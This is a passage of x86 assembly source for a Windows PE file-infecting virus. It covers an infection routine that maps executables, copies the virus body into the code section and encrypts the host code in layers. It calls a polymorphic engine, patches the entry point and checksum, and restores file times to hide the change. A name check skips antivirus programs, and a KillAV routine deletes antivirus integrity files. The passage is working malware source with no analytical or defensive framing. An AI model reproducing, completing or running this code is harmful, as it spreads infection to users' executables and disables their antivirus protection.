   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Infect_File:                       ;Ý
          pusha                       ;Ýsave regs
                              ;Ý
          mov [ebp+flag], 0               ;Ý
                              ;Ý
          push edi                    ;Ý
          call ValidateName               ;Ývalidate the file
          jc quit_infection               ;Ýname (e.g. no AV)
                              ;Ý
          push edi                    ;Ý
          call [ebp+_GetFileAttributesA]          ;Ýsave file's attributes
          mov [ebp+fileattributes], eax           ;Ý
                              ;Ý
          push 80h                    ;Ý
          push edi                    ;Ý
          call [ebp+_SetFileAttributes]           ;Ýset attributes to norm.
                              ;Ý
          push 0                      ;Ýopen the file!
          push FILE_ATTRIBUTE_NORMAL          ;Ý
          push OPEN_EXISTING              ;Ý
          push 0                      ;Ý
          push FILE_SHARE_READ + FILE_SHARE_WRITE     ;Ý
          push GENERIC_READ + GENERIC_WRITE       ;Ý
          push edi                    ;Ý
          call [ebp+_CreateFileA]             ;Ý
                              ;Ý
          call CheckError                 ;Ý
          jc quit_infection               ;Ý
                              ;Ý
          mov [ebp+filehandle], eax           ;Ýsave handle
                              ;Ý
          lea ebx, [ebp+filetime]             ;Ýsave the file time
          push ebx                    ;Ý
          add ebx, 8                  ;Ý
          push ebx                    ;Ý
          add ebx, 8                  ;Ý
          push ebx                    ;Ý
          push eax                    ;Ý
          call [ebp+_GetFileTime]             ;Ý
                              ;Ý
          push 0                      ;Ýget the file size
          push [ebp+filehandle]               ;Ý
          call [ebp+_GetFileSize]             ;Ý
                              ;Ý
          call CheckError                 ;Ý
          jc close_file                   ;Ý
                              ;Ý
          mov [ebp+filesize], eax             ;Ýcalculate the memory
          add eax, incrsize               ;Ýsize
          mov [ebp+memsize], eax              ;Ý
                              ;Ý
          push 0                      ;Ýcreate a file mapping
          push [ebp+memsize]              ;Ýobject
          push 0                      ;Ý
          push PAGE_READWRITE             ;Ý
          push 0                      ;Ý
          push [ebp+filehandle]               ;Ý
          call [ebp+_CreateFileMappingA]          ;Ý
                              ;Ý
          call CheckError                 ;Ý
          jc close_file                   ;Ý
                              ;Ý
          mov [ebp+maphandle], eax            ;Ýsave the map handle
                              ;Ý
          push [ebp+memsize]              ;Ýmap the file!
          push 0                      ;Ý
          push 0                      ;Ý
          push FILE_MAP_ALL_ACCESS            ;Ý
          push eax                    ;Ý
          call [ebp+_MapViewOfFile]           ;Ý
                              ;Ý
          call CheckError                 ;Ý
          jc close_map                ;Ý
                              ;Ý
          mov [ebp+mapaddress], eax           ;Ýsave the map address
                              ;Ý
          mov esi, eax                ;Ý
                              ;Ý
          cmp word ptr [esi], 'ZM'            ;ÝDos signature
          jne unmap_view                  ;Ý
          mov esi, dword ptr [esi.MZ_lfanew]      ;Ýget PEheader offset
          add esi, [ebp+mapaddress]           ;Ý
                              ;Ý
          push 200h                   ;Ýcan we read?
          push esi                    ;Ý
          call [ebp+_IsBadReadPtr]            ;Ý
          or eax, eax                 ;Ý
          jnz close_map                   ;Ý
                              ;Ý
          cmp word ptr [esi], 'EP'            ;ÝPE file?
          jne unmap_view                  ;Ý
                              ;Ý
          lea edi, [ebp+data_area]            ;Ýour data area
                              ;Ý
          mov eax, esi                ;Ýnow get and save
          stosd                       ;Ýall the needed data from
          mov ax, [esi.NumberOfSections]          ;Ýthe PE headers
          stosw                       ;Ý
          mov ax, [esi.SizeOfOptionalHeader]      ;Ý
          stosw                       ;Ý
                              ;Ý
          add esi, IMAGE_FILE_HEADER_SIZE         ;Ý
                              ;Ý
          mov ax, [esi.OH_MajorImageVersion]      ;Ýalready infected?
          cmp ax, 'TH'                ;Ý
          je close_map                ;Ý
                              ;Ý
          mov [esi.OH_MajorImageVersion], 'TH'    ;Ý
                              ;Ý
          mov eax, esi                ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_SizeOfCode]        ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_ImageBase]         ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_FileAlignment]         ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_SectionAlignment]      ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_AddressOfEntryPoint]       ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_BaseOfCode]        ;Ý
          stosd                       ;Ý
          mov eax, [esi.OH_SizeOfImage]           ;Ý
          stosd                       ;Ý
          jmp overdata                ;Ý
                              ;Ý
   data_area:                     ;Ýusefull data...
          peheader         dd 0           ;Ý
          numberofsections     dw 0           ;Ý
          sizeofoptionalheader dw 0           ;Ý
          optionalheader       dd 0           ;Ý
          sizeofcode       dd 0           ;Ý
          image_base       dd 0           ;Ý
          filealign        dd 0           ;Ý
          sectionalign     dd 0           ;Ý
          eip          dd 0           ;Ý
          baseofcode       dd 0           ;Ý
          sizeofimage      dd 0           ;Ý
          firstsection     dd 0           ;Ý
          codesection      dd 0           ;Ý
          lastsection      dd 0           ;Ý
          randomincr       dd 0           ;Ý
   overdata:                      ;Ý
          cmp [ebp+sizeofcode], virussize         ;Ýour virus can fit the
          jb unmap_view                   ;Ýcode section?
                              ;Ý
          mov eax, [ebp+image_base]           ;Ý
          mov dword ptr [ebp+@500+2], eax         ;Ý
                              ;Ý
          add si, word ptr [ebp+sizeofoptionalheader] ;Ý
          mov eax, esi                ;Ý
          stosd                       ;Ý
          xor ebx, ebx                ;Ý
                              ;Ý
   locate_code_section:                   ;Ýlet's locate the code
          mov eax, [esi.SH_VirtualAddress]        ;Ýsection...
          cmp eax, [ebp+baseofcode]           ;Ý
          je found_it                 ;Ý
          add esi, IMAGE_SIZEOF_SECTION_HEADER    ;Ý
          inc bx                      ;Ý
          cmp bx, [ebp+numberofsections]          ;Ý
          jae unmap_view                  ;Ý
          jmp locate_code_section             ;Ý
                              ;Ý
   found_it:                      ;Ý
          mov eax, esi                ;Ýfound!
          stosd                       ;Ý
                              ;Ý
          xor eax, eax                ;Ýlet's locate the
          mov ax, [ebp+numberofsections]          ;Ýlast section's header
          mov ecx, IMAGE_SIZEOF_SECTION_HEADER    ;Ý
          dec eax                     ;Ý
          xor edx, edx                ;Ý
          mul ecx                     ;Ý
          mov esi, [ebp+firstsection]         ;Ý
          add esi, eax                ;Ý
          mov eax, esi                ;Ý
          stosd                       ;Ý
                              ;Ý
          mov eax, [ebp+sizeofcode]           ;Ýget a random offset from
          sub eax, virussize+10h              ;Ýthe start to put the
          call brandom32                  ;Ýcode there...
          mov [ebp+randomincr], eax           ;Ý
                              ;Ý
          mov ebx, [ebp+codesection]          ;Ýgo to code section's
          mov esi, [ebx.SH_PointerToRawData]      ;Ýraw data
          add esi, [ebp+randomincr]           ;Ý
                              ;Ýsave the address
          mov ebx, [ebp+lastsection]          ;Ýgo to the last section
          mov edi, [ebx.SH_PointerToRawData]      ;Ýat it's end...
          add edi, [ebx.SH_VirtualSize]           ;Ý
                              ;Ý...and save that
          add edi, [ebp+mapaddress]           ;Ýnormalize...
          add esi, [ebp+mapaddress]           ;Ý
          mov ecx, virussize              ;Ýbytes to transfer
          rep movsb                   ;Ýmove the code...
                              ;Ý
          mov eax, [ebx.SH_VirtualAddress]        ;Ýand also fill in the
          add eax, [ebx.SH_VirtualSize]           ;Ýaddress for the reloc.
          mov dword ptr [ebp+@7+1], eax           ;Ýcode
                              ;Ý
          mov dword ptr [ebp+@10+1], eax          ;Ýand for the decryptor
          add eax, virussize              ;Ý
          mov [ebp+jumper], eax               ;Ýsave this value
                              ;Ý
          mov esi, [ebp+codesection]          ;Ýfill more...
          mov eax, [esi.SH_VirtualAddress]        ;Ý
          add eax, [ebp+randomincr]           ;Ý
          mov dword ptr [ebp+@8+1], eax           ;Ý
                              ;Ý
          mov eax, [ebp+eip]              ;Ýfill the jump
          mov dword ptr [ebp+@9+1], eax           ;Ý
                              ;Ý
          lea esi, [ebp+relocating_code]          ;Ýnow move also the
          mov ecx, relo_code_size             ;Ýrelocating code
          rep movsb                   ;Ý
                              ;Ý
          pusha                       ;Ýnow let's encrypt the
          mov edi, [ebx.SH_PointerToRawData]      ;Ýoriginal code plus the
          add edi, [ebx.SH_VirtualSize]           ;Ýrelocating code which
          add edi, [ebp+mapaddress]           ;Ýare now at the end of
          mov eax, 0FFFFFFFEh             ;Ýthe last section. The
          call brandom32                  ;Ýencryption is multi-
          mov dword ptr [ebp+key], eax        ;Ýiterative with sliding
          mov eax, 0FFFFFFFEh             ;Ýkey, fixed key, fixed
          call brandom32                  ;Ýoperation. Max 100h
          mov dword ptr [ebp+increment], eax      ;Ýiterations multiplied
          mov eax, 50h                ;Ýby around 500h gives
          call brandom32                  ;Ýthe total number of
          add eax, 50h                ;Ýloops.
          mov eax, 1                  ;Ý
          mov [ebp+iterations], eax           ;Ý
                              ;Ý
          mov eax, [ebp+key]              ;Ýget key
          mov esi, [ebp+increment]            ;Ýget key increment
          mov ecx, incrsize/4             ;Ýsize of code
          mov ebx, [ebp+iterations]           ;Ýnumber of iterations
          push edi                    ;Ýsave edi
                              ;Ý
   encrypt_loop:                      ;Ý
          mov edx, [edi]                  ;Ýget dword
          rol edx, 1                  ;Ý
          xor edx, esi                ;Ý
          sub edx, eax                ;Ý
          sub eax, esi                ;Ý
          mov [edi], edx                  ;Ýand store
          add edi, 4                  ;Ýgo to next dword
          loop encrypt_loop               ;Ýloop until end
          dec ebx                     ;Ýdecrement iterations
          jz ready_                   ;Ý
          mov eax, [ebp+key]              ;Ý
          mov ecx, incrsize/4             ;Ýredo all...
          pop edi                     ;Ý
          push edi                    ;Ý
          jmp encrypt_loop                ;Ý
                              ;Ý
   ready_:                        ;Ý
          pop edi                     ;Ý
          popa                    ;Ý
                              ;Ý
          mov esi, [ebp+codesection]          ;Ýand now move the virus
          mov edi, [esi.SH_PointerToRawData]      ;Ýbody over the original
          add edi, [ebp+randomincr]           ;Ý
          lea esi, [ebp+start]            ;Ýcode section.
          add edi, [ebp+mapaddress]           ;Ý
          push edi                    ;Ý
          mov ecx, virussize              ;Ý
          rep movsb                   ;Ý
                              ;Ý
          mov eax, [ebp+codesection]          ;Ýstore the new EIP
          mov eax, [eax.SH_VirtualAddress]        ;Ý
          add eax, [ebp+randomincr]           ;Ý
          mov [ebp+neweip], eax               ;Ý
          add eax, @12-start-1            ;Ýand fill in the image
          pop edx                     ;Ýbase getter
          add edx, (@12-start)+1              ;Ý
          mov dword ptr [edx], eax            ;Ý
                              ;Ý
          mov eax, [ebp+codesection]          ;Ýnow fill the jump
          mov edx, [eax.SH_PointerToRawData]      ;Ýto the host
          add edx, [ebp+mapaddress]           ;Ý
          add edx, [ebp+randomincr]           ;Ý
          add edx, @11-start+1            ;Ý
          mov eax, [ebp+jumper]               ;Ý
          mov dword ptr [edx], eax            ;Ý
                              ;Ý
          pusha                       ;Ýnow do the level 2
          mov ecx, 100h                   ;Ýencryption
                              ;Ý
   encrypt_iteration:                 ;Ý
          mov edx, 'DEAD'+'MEAT'              ;Ý
          mov esi, [ebp+codesection]          ;Ý
          mov edi, [esi.SH_PointerToRawData]      ;Ý
          add edi, (decrypt_level_2 - start)      ;Ý
          add edi, [ebp+randomincr]           ;Ý
          add edi, [ebp+mapaddress]           ;Ý
          mov esi, edi                ;Ý
          mov ebx, (end-decrypt_level_2)/4        ;Ý
                              ;Ý
   encrypt_routine:                   ;Ý
          lodsd                       ;Ý
                              ;Ý
          add eax, edx                ;Ý
          sub eax, 'THUN'+'DERP'+'ICK'        ;Ý
          ror eax, 16                 ;Ý
          xor eax, 'LORD'+'JULU'+'S'          ;Ý
          rol eax, 16                 ;Ý
          add edx, 'KICK'+'ASS!'              ;Ý
                              ;Ý
          stosd                       ;Ý
          dec ebx                     ;Ý
          jnz encrypt_routine             ;Ý
          loop encrypt_iteration              ;Ý
          popa                    ;Ý
                              ;Ý
          add [ebx.SH_VirtualSize], incrsize      ;Ýincrease Virtual Size
                              ;Ýof last section
          mov eax, [ebx.SH_SizeOfRawData]         ;Ýincrease Size of raw
          add eax, incrsize               ;Ýdata and align it
          mov ecx, [ebp+filealign]            ;Ý
          xor edx, edx                ;Ý
          div ecx                     ;Ý
          inc eax                     ;Ý
          mul ecx                     ;Ý
          mov [ebx.SH_SizeOfRawData], eax         ;Ý
                              ;Ý
          or [ebx.SH_Characteristics], 0C0000000h     ;Ýmake it R/W
                              ;Ý
          mov eax, [ebx.SH_PointerToRawData]      ;Ýnow calculate the new
          add eax, [ebx.SH_VirtualSize]           ;Ýfile size
          mov edi, eax                ;Ý
          mov ecx, [ebp+filealign]            ;Ý
          xor edx, edx                ;Ý
          div ecx                     ;Ý
          inc eax                     ;Ý
          mul ecx                     ;Ý
          mov [ebp+filesize], eax             ;Ý
                              ;Ý
          mov ecx, eax                ;Ýzero the rest
          sub ecx, edi                ;Ý
          add edi, [ebp+mapaddress]           ;Ý
          xor eax, eax                ;Ý
          rep stosb                   ;Ý
                              ;Ý
          pusha                       ;Ýprepare to call the
          mov eax, [ebp+codesection]          ;Ýpoly engine
          mov eax, [eax.SH_VirtualAddress]        ;Ý
          add eax, [ebp+randomincr]           ;Ý
          add eax, poly_code_start-start          ;Ý
          mov ebx, eax                ;Ý
                              ;Ý
          mov edi, [ebp+codesection]          ;Ý
          mov edi, [edi.SH_PointerToRawData]      ;Ý
          add edi, [ebp+mapaddress]           ;Ý
          add edi, [ebp+randomincr]           ;Ý
          add edi, poly_code_start-start          ;Ý
                              ;Ý
          mov esi, edi                ;Ý
          sub esi, poly_code_start-start          ;Ý
          add esi, poly_decryptor-start           ;Ý
                              ;Ý
          mov ecx, end-poly_code_start        ;Ý
                              ;Ý
          call create_poly                ;Ýmake the poly decr.
                              ;Ý
          popa                    ;Ý
                              ;Ý
          mov eax, [ebp+sizeofimage]          ;Ýnow calculate the new
          add eax, incrsize               ;Ýsize of image
          mov ecx, [ebp+sectionalign]         ;Ý
          xor edx, edx                ;Ý
          div ecx                     ;Ý
          inc eax                     ;Ý
          mul ecx                     ;Ý
                              ;Ý
          mov esi, [ebp+optionalheader]           ;Ý
          mov [esi.OH_SizeOfImage], eax           ;Ýstore it!
                              ;Ý
          mov eax, [ebp+neweip]               ;Ýstore the new EIP
          mov [esi.OH_AddressOfEntryPoint], eax       ;Ý
                              ;Ý
          cmp [esi.OH_CheckSum], 0            ;Ýis the checksum null?
          je no_checksum                  ;Ý
                              ;Ý
          call @21                    ;Ý
          db 'Imagehlp.DLL', 0            ;Ý
   @21:   call [ebp+_LoadLibraryA]            ;Ý
          or eax, eax                 ;Ý
          jz no_checksum                  ;Ý
                              ;Ý
          call @20                    ;Ýhere we try to retrieve
          db 'CheckSumMappedFile', 0          ;Ýthe checksum API
   @20:   push eax                    ;Ýif we fail it means we
          call [ebp+_GetProcAddress]          ;Ýwe don't have this api
          or eax, eax                 ;Ý
          jz no_checksum                  ;Ý
                              ;Ý
          call @22                    ;Ýcompute the new
   chksum dd 0                    ;Ýchecksum...
   @22:   call @23                    ;Ý
          dd 0                    ;Ý
   @23:   push [ebp+filesize]             ;Ý
          push [ebp+mapaddress]               ;Ý
          call eax                    ;Ý
                              ;Ý
          mov eax, [ebp+chksum]               ;Ý
          mov [esi.OH_CheckSum], eax          ;Ýand fill it up...
                              ;Ý
   no_checksum:                       ;Ý
          mov ebx, [ebp+codesection]          ;Ýmake code section R/W
          or [ebx.SH_Characteristics], 0C0000000h     ;Ý
                              ;Ý
          mov [ebp+flag], 1               ;Ýmark good infection
                              ;Ý
   unmap_view:                    ;Ý
          push [ebp+mapaddress]               ;Ýunmap the file
          call [ebp+_UnmapViewOfFile]         ;Ý
                              ;Ý
   close_map:                     ;Ý
          push [ebp+maphandle]            ;Ýclose the map
          call [ebp+_CloseHandle]             ;Ý
                              ;Ý
   close_file:                    ;Ý
          push FILE_BEGIN                 ;Ýset the file pointer
          push 0                      ;Ýto the filesize
          push [ebp+filesize]             ;Ý
          push [ebp+filehandle]               ;Ý
          call [ebp+_SetFilePointer]          ;Ý
                              ;Ý
          push [ebp+filehandle]               ;Ýset the end of file
          call [ebp+_SetEndOfFile]            ;Ý
                              ;Ý
          lea ebx, [ebp+filetime]             ;Ýrestore the file time
          push ebx                    ;Ý
          add ebx, 8                  ;Ý
          push ebx                    ;Ý
          add ebx, 8                  ;Ý
          push ebx                    ;Ý
          push [ebp+filehandle]               ;Ý
          call [ebp+_SetFileTime]             ;Ý
                              ;Ý
          push [ebp+filehandle]               ;Ýclose the file
          call [ebp+_CloseHandle]             ;Ý
                              ;Ý
   quit_infection:                    ;Ýrestore the attributes
          pop edi                     ;Ý
          push [ebp+fileattributes]           ;Ý
          push edi                    ;Ý
          call [ebp+_SetFileAttributes]           ;Ý
          popa                    ;Ý
          cmp [ebp+flag], 1               ;Ý
          je do_clc                   ;Ý
          stc                     ;Ýbad infection
          ret                     ;Ý
                              ;Ý
   do_clc:                        ;Ý
          clc                     ;Ýgood infection
          ret                     ;Ýreturn
   filetime       dq 0, 0, 0              ;Ý
   filesize       dd 0                ;Ý
   filehandle     dd 0                ;Ý
   memsize        dd 0                ;Ý
   maphandle      dd 0                ;Ý
   mapaddress     dd 0                ;Ý
   fileattributes dd 0                ;Ý
   neweip         dd 0                ;Ý
   flag           db 0                ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ValidateName:                      ;Ý
          pushad                      ;Ý
                              ;Ý
          lea esi, [ebp+avoid_list]           ;Ýpoint avoid list
                              ;Ý
   repeat_check_files:                ;Ý
          push esi                    ;Ý
          call [ebp+_lstrlen]             ;Ýget length of string
          mov ecx, eax                ;Ý
                              ;Ý
          push esi edi                ;Ý
          rep cmpsb                   ;Ýcompare string
          je file_invalid                 ;Ý
          pop edi esi                 ;Ý
          add esi, eax                ;Ýgo to the next name
          inc esi                     ;Ý
          cmp byte ptr [esi], 0FFh            ;Ýthe end?
          je file_valid                   ;Ý
          jmp repeat_check_files              ;Ý
                              ;Ý
   file_valid:                    ;Ý
          clc                     ;Ýfile can be infected
          popad                       ;Ý
          ret                     ;Ý
                              ;Ý
   file_invalid:                      ;Ý
          pop edi ecx                 ;Ý
          stc                     ;Ýfile cannot be infected
          popad                       ;Ý
          ret                     ;Ý
                              ;Ý
   avoid_list label                   ;Ý
          db 'TB'     ,0              ;Ý
          db 'F-'     ,0              ;Ý
          db 'AW'     ,0              ;Ý
          db 'AV'     ,0              ;Ý
          db 'NAV'    ,0              ;Ý
          db 'PAV'    ,0              ;Ý
          db 'RAV'    ,0              ;Ý
          db 'NVC'    ,0              ;Ý
          db 'FPR'    ,0              ;Ý
          db 'DSS'    ,0              ;Ý
          db 'IBM'    ,0              ;Ý
          db 'INOC'   ,0              ;Ý
          db 'ANTI'   ,0              ;Ý
          db 'SCN'    ,0              ;Ý
          db 'VSAF'   ,0              ;Ý
          db 'VSWP'   ,0              ;Ý
          db 'PANDA'  ,0              ;Ý
          db 'DRWEB'  ,0              ;Ý
          db 'FSAV'   ,0              ;Ý
          db 'SPIDER' ,0              ;Ý
          db 'ADINF'  ,0              ;Ý
          db 'EXPLORER',0             ;Ýhmmmm...
          db 'SONIQUE',0              ;Ý
          db 'SQSTART',0              ;Ý
          db 0FFh                 ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   KillAV:                        ;Ý
          pushad                      ;Ý
          lea edi, [ebp+offset searchfiles]       ;Ýpoint to Search Record
          lea esi, [ebp+offset av_list]           ;Ýpoint av files list
                              ;Ý
   locate_next_av:                    ;Ý
          cmp byte ptr [esi], 0FFh            ;Ý
          je av_kill_done                 ;Ý
          mov eax, esi                ;Ý
          cmp byte ptr [eax], 0FFh            ;Ýis this the end?
          je av_kill_done                 ;Ý
          push edi                    ;Ýpush search rec. address
          push eax                    ;Ýpush filename address
          call [ebp+_FindFirstFileA]          ;Ýfind first match
          cmp eax, 0FFFFFFFFh             ;Ýcheck for EAX = -1
          je next_av_file                 ;Ý
          push eax                    ;Ý
          lea ebx, [edi.WFD_cFileName]        ;ÝESI = ptr to filename
          push 80h                    ;Ý
          push ebx                    ;Ý
          call [ebp+_SetFileAttributes]           ;Ý
          push ebx                    ;Ýpush filename address
          call [ebp+_DeleteFileA]             ;Ýdelete file!
                              ;Ý
          call [ebp+_FindClose]               ;Ýclose the find handle
                              ;Ý
   next_av_file:                      ;Ý
          push edi                    ;Ý
          mov edi, esi                ;Ý
          mov al, 0                   ;Ý
          mov ecx, 100                ;Ý
          repnz scasb                 ;Ý
          mov esi, edi                ;Ý
          pop edi                     ;Ý
          jmp locate_next_av              ;Ý
                              ;Ý
   av_kill_done:                      ;Ý
          popad                       ;Ý
          ret                     ;Ý
                              ;Ý
   searchfiles WIN32_FIND_DATA <?>            ;Ý
                              ;Ý
   av_list      db "AVP.CRC"     , 0          ;Ýthe av files to kill
            db "IVP.NTZ"     , 0          ;Ý
            db "Anti-Vir.DAT", 0          ;Ý
            db "CHKList.MS"  , 0          ;Ý
            db "CHKList.CPS" , 0          ;Ý
            db "SmartCHK.MS" , 0          ;Ý
            db "SmartCHK.CPS", 0          ;Ý
            db 0FFh               ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ReturnToHost:                      ;ÝHere we return to the
          jmp restore_seh                 ;Ýhost
                              ;Ý
   ExceptionExit:                     ;Ýif we had an error we
          mov esp, [esp+8]                ;Ýmust restore the ESP
                              ;Ý
   restore_seh:                       ;Ý
          pop dword ptr fs:[0]            ;Ýand restore the SEH
          add esp, 4                  ;Ýreturning to the host...
                              ;Ý
          db 0BDh                     ;Ýrestore delta handle
   delta  dd 0                    ;Ý
                              ;Ý
          cmp [ebp+gen1], 1               ;Ýis it generation 0?
          je generation0_exit             ;Ý
                              ;Ý
   @11:   mov eax, 12345678h              ;Ýprepare to jump to
          add eax, [ebp+imagebase]            ;Ýthe relocating code
                              ;Ý
          mov esi, eax                ;Ý
          add esi, (@14-relocating_code)          ;Ý
          mov ebx, [ebp+imagebase]            ;Ý
          mov dword ptr [esi+1], ebx          ;Ý
                              ;Ý
          push eax                    ;Ýdo it!
          ret                     ;Ý
                              ;Ý
   generation0_exit:                  ;Ý
          popa                    ;Ý
          push 0                      ;Ý
          call ExitProcess                ;Ý
   gen1 dd 0                      ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   CheckError proc near                   ;Ý
          or eax, eax                 ;Ýsets carry flag if
          jz error_found                  ;Ýeax = 0 or eax = -1
          cmp eax, -1                 ;Ý
          jz error_found                  ;Ý
          clc                     ;Ý
          ret                     ;Ý
                              ;Ý
   error_found:                       ;Ý
          stc                     ;Ý
          ret                     ;Ý
   CheckError endp                    ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;RoundUp:                      ;ÝThis routine rounds
   ;   push edx                   ;Ýthe value in EAX to
   ;   xor edx, edx                   ;Ýthe value in ECX (used
   ;   div ecx                    ;Ýto align section and
   ;   inc ax                     ;Ýfile sizes).
   ;   mul ecx                    ;Ý
   ;   pop edx                    ;Ý
   ;   ret                    ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   k32_API_names label                ;Ý
             db "GetModuleHandleA",0          ;Ý
             db "ExitProcess", 0          ;Ý
             db "GlobalAlloc", 0          ;Ý
             db "GlobalFree", 0           ;Ý
             db "GetWindowsDirectoryA", 0     ;Ý
             db "GetSystemDirectoryA", 0      ;Ý
             db "GetCurrentDirectoryA", 0     ;Ý
             db "SetCurrentDirectoryA", 0     ;Ý
             db "FindFirstFileA", 0           ;Ý
             db "FindNextFileA", 0        ;Ý
             db "GetDriveTypeA", 0        ;Ý
             db "CloseHandle", 0          ;Ý
             db "FindClose", 0            ;Ý
             db "CreateFileA", 0          ;Ý
             db "CreateFileMappingA", 0       ;Ý
             db "MapViewOfFile", 0        ;Ý
             db "UnmapViewOfFile", 0          ;Ý
             db "SetFilePointer", 0           ;Ý
             db "SetEndOfFile", 0         ;Ý
             db "GetFileSize", 0          ;Ý
             db "lstrlen", 0              ;Ý
             db "SetFileTime", 0          ;Ý
             db "GetFileTime", 0          ;Ý
             db "GetProcAddress", 0           ;Ý
             db "FlushViewOfFile", 0          ;Ý
             db "GetLastError", 0         ;Ý
             db "GetSystemTime", 0        ;Ý
             db "GetFileAttributesA", 0       ;Ý
             db "SetFileAttributesA", 0       ;Ý
             db "DeleteFileA", 0          ;Ý
             db "LoadLibraryA", 0         ;Ý
             db "IsBadReadPtr",0          ;Ý
             db 0FFh                  ;Ý
                              ;Ý
   k32_API_addrs label                ;Ý
                              ;Ý
   _GetModuleHandleA       dd 0           ;Ý
   _ExitProcess            dd 0           ;Ý
   _GlobalAlloc            dd 0           ;Ý
   _GlobalFree         dd 0           ;Ý
   _GetWindowsDirectoryA       dd 0           ;Ý
   _GetSystemDirectoryA        dd 0           ;Ý
   _GetCurrentDirectoryA       dd 0           ;Ý
   _SetCurrentDirectoryA       dd 0           ;Ý
   _FindFirstFileA         dd 0           ;Ý
   _FindNextFileA          dd 0           ;Ý
   _GetDriveTypeA          dd 0           ;Ý
   _CloseHandle            dd 0           ;Ý
   _FindClose          dd 0           ;Ý
   _CreateFileA            dd 0           ;Ý
   _CreateFileMappingA     dd 0           ;Ý
   _MapViewOfFile          dd 0           ;Ý
   _UnmapViewOfFile        dd 0           ;Ý
   _SetFilePointer         dd 0           ;Ý
   _SetEndOfFile           dd 0           ;Ý
   _GetFileSize            dd 0           ;Ý
   _lstrlen            dd 0           ;Ý
   _SetFileTime            dd 0           ;Ý
   _GetFileTime            dd 0           ;Ý
   _GetProcAddress         dd 0           ;Ý
   _FlushViewOfFile        dd 0           ;Ý
   _GetLastError           dd 0           ;Ý
   _GetSystemTime          dd 0           ;Ý
   _GetFileAttributesA     dd 0           ;Ý
   _SetFileAttributes      dd 0           ;Ý
   _DeleteFileA            dd 0           ;Ý
   _LoadLibraryA           dd 0           ;Ý
   _IsBadReadPtr           dd 0           ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   u32_API_names label                ;Ý
             db "MessageBoxA", 0          ;Ý
             db 0FFh                  ;Ý
                              ;Ý
   u32_API_addrs label                ;Ý
                              ;Ý
   _MessageBoxA            dd 0           ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   k32         dd 0               ;Ý
   kernel32_name       db "Kernel32.DLL", 0       ;Ý
   user32_name     db "USER32.dll", 0         ;Ý
                              ;Ý
   getmodulehandle     db "GetModuleHandleA"      ;Ý
   getmodulehandlelen  =  $-offset getmodulehandle    ;Ý
   getprocaddress      db "GetProcAddress", 0     ;Ý
   getprocaddresslen   =  $-offset getprocaddress     ;Ý
   key    dd 0                    ;Ý
   increment  dd 0                    ;Ý
   iterations dd 0                    ;Ý
   jumper     dd 0                    ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   FindNeededStuff:                   ;Ý
          lea eax, [ebp+ExceptionExit]        ;ÝSetup a SEH frame
          push eax                    ;Ý
          push dword ptr fs:[0]               ;Ý
          mov fs:[0], esp                 ;Ý
                              ;Ý
          mov eax, [esp+28h]              ;Ýfirst let's locate the
          lea edx, [ebp+kernel32_name]        ;Ýkernel32 base address
          call LocateKernel32             ;Ý
          jc ReturnToHost                 ;Ý
          mov dword ptr [ebp+k32], eax        ;Ýsave it...
                              ;Ý
